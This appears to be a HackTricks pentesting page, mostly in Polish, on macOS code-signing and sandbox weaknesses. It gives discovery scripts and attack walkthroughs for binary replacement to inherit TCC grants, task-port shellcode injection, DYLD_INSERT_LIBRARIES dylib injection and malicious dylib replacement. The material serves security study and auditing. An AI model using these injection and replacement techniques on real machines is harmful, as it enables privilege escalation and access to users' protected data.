# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Basic Information

**Ad-hoc signing** (`CS_ADHOC`) tworzy sygnaturę kodu z **brakiem łańcucha certyfikatów** — jest to hash kodu bez weryfikacji tożsamości developera. Pochodzenia binary nie można powiązać z żadnym developerem ani organizacją.<sup>[[1]](#references)[[4]](#references)</sup>

Na Macach z Apple Silicon wszystkie pliki wykonywalne wymagają co najmniej sygnatury ad-hoc. Oznacza to, że sygnatury ad-hoc znajdziesz w wielu narzędziach deweloperskich, pakietach Homebrew i narzędziach firm trzecich.

### Why This Matters

- **Brak weryfikowalnej tożsamości** — binary może zostać podmieniony bez wykrycia przez mechanizmy sprawdzające tożsamość
- Ad-hoc binaries firm trzecich znajdujące się w **uprzywilejowanych lokalizacjach** (FDA, daemony, helpery) są celami o wysokim priorytecie
- W niektórych konfiguracjach sygnatury ad-hoc mogą **nie być weryfikowane tak rygorystycznie** jak kod podpisany przez developera
- Ad-hoc signed binaries posiadające **TCC grants** są szczególnie wartościowe — grants pozostają aktywne nawet po zmianie zawartości binary (zależy to od sposobu, w jaki TCC powiązał grant)

### Discovery
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attack: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Procesy możliwe do debugowania (get-task-allow)

### Podstawowe informacje

Uprawnienie **`com.apple.security.get-task-allow`** (lub flaga **`CS_GET_TASK_ALLOW`**) pozwala **dowolnemu procesowi podłączyć się jako debugger**, odczytywać pamięć, modyfikować rejestry, wstrzykiwać kod i kontrolować wykonywanie.<sup>[[3]](#references)</sup>

Jest to przeznaczone **wyłącznie dla buildów deweloperskich**. Jednak niektóre pliki binarne firm trzecich są dostarczane z tym uprawnieniem w wersji produkcyjnej.

> [!CAUTION]
> Produkcyjny plik binarny z `get-task-allow` jest **natychmiastowym prymitywem exploitation**. Dowolny lokalny proces może wywołać `task_for_pid()`, uzyskać port zadania Mach celu i wstrzyknąć dowolny kod, który będzie działał z uprawnieniami celu, przyznanymi uprawnieniami TCC oraz jego kontekstem bezpieczeństwa.

### Wykrywanie
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Atak: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Brak walidacji bibliotek + środowisko DYLD

### Czyszczenie walidacji bibliotek w czasie działania

Prywatne entitlement **`com.apple.private.security.clear-library-validation`** nie wyłącza walidacji bibliotek podczas uruchamiania procesu. Zamiast tego pozwala procesowi wywołać na sobie `csops(..., CS_OPS_CLEAR_LV, ...)` w czasie działania. XNU następnie usuwa `CS_REQUIRE_LV | CS_FORCED_LV`, pod warunkiem że wywołujący ma ten entitlement i spełnia dodatkowe kontrole handlera. W rezultacie proces może stać się użytecznym celem library injection dopiero po osiągnięciu ścieżki kodu, która czyści walidację bibliotek.<sup>[[4]](#references)[[5]](#references)</sup>

### Śmiertelna kombinacja

Gdy binary ma **oba**:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (ładuje dowolny dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (akceptuje zmienne środowiskowe DYLD)

Jest to **gwarantowany primitive code injection** — `DYLD_INSERT_LIBRARIES` działa bez problemu.

### Wykrywanie
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Atak: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Tymczasowe wyjątki Sandboxa

### Jak osłabiają Sandbox

Tymczasowe wyjątki Sandboxa (`com.apple.security.temporary-exception.*`) tworzą luki w App Sandboxie:<sup>[[2]](#references)</sup>

| Wyjątek | Co umożliwia |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Łączenie się z systemowymi usługami XPC/Mach |
| `temporary-exception.files.absolute-path.read-write` | Odczytywanie/zapisywanie plików poza kontenerem aplikacji |
| `temporary-exception.iokit-user-client-class` | Otwieranie połączeń z user-client IOKit |
| `temporary-exception.shared-preference.read-only` | Odczytywanie preferencji innych aplikacji |
| `temporary-exception.files.home-relative-path.read-write` | Uzyskiwanie dostępu do ścieżek względnych względem `~` |

### Wyjątki Mach-Lookup = prymityw ucieczki z Sandboxa

Najbardziej niebezpiecznym wyjątkiem jest **mach-lookup** — umożliwia aplikacji działającej w Sandboxie komunikowanie się z uprzywilejowanymi daemonami:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Atak: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Prywatne Entitlements Apple

### Czym są

Entitlements z prefiksem `com.apple.private.*` zapewniają dostęp do **wewnętrznych API Apple**, które nie są udokumentowane ani dostępne dla deweloperów zewnętrznych. Binarne pliki firm trzecich z prywatnymi entitlements uzyskiwano za pośrednictwem enterprise cert, MDM lub dystrybucji spoza App Store.

### Niebezpieczne prywatne Entitlements

| Entitlement | Możliwość |
|---|---|
| `com.apple.private.tcc.manager` | Pełny odczyt/zapis bazy danych TCC |
| `com.apple.private.tcc.allow` | Dostęp do określonych usług TCC |
| `com.apple.private.security.no-sandbox` | Uruchamianie bez sandboxa |
| `com.apple.private.iokit` | Bezpośredni dostęp do sterowników IOKit |
| `com.apple.private.kernel.\*` | Dostęp do interfejsu kernela |
| `com.apple.private.xpc.launchd.job-label` | Rejestrowanie/zarządzanie zadaniami launchd |
| `com.apple.rootless.install` | Zapisywanie do ścieżek chronionych przez SIP |

### Wykrywanie
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Niestandardowe profile Sandbox (SBPL)

### Czym są

Pliki binarne mogą zawierać **niestandardowe profile sandbox** napisane w SBPL (Seatbelt Profile Language). Te profile mogą być bardziej restrykcyjne LUB **bardziej liberalne** niż domyślny App Sandbox.

### Audyt niestandardowych profili
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Ścieżki bibliotek z możliwością zapisu

### Czym są

Gdy binary ładuje dynamic library ze ścieżki, do której bieżący użytkownik ma uprawnienia **zapisu**, bibliotekę można zastąpić złośliwym kodem.

### Odkrywanie
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Attack: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Przewodnik po podpisywaniu kodu](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Uprawnienia](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (operacje `CS_OPS_*` i `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (obsługa `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
{{#include ../../../banners/hacktricks-training.md}}
